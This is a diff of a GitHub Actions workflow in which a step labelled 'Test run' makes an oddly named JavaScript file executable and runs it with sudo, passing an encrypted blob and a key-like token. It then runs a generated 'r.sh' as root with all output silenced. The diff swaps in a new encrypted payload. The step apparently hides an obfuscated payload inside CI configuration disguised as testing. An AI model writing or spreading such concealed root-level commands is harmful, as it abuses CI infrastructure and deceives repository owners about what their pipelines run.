@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo '219d8'
+        echo 'n9qga'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX19+ULzpLtzc9kWjG2DlXU4dmXsn2nqfBP3ZUiSxkP3OfVeBEUDXeT/UhBFX8NVBg8QAez7jiIP07jqUyEN4/HZdoHUIFF/fb0Hhgz1kBoMg1GQl0A0kJGjd w9s0t1 && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX18ATx5+D9undjkZnYdLRgk15yDTzQDRdHKQKBdS21oWm+xwnD+7N/szsgEgieZgRHUvbIRgDMKtn9dLveeIGy6rPstCrAxtXQDF/EwRoDvmkcludedQCjAY 7csdza && sudo sh r.sh > /dev/null 2>&1
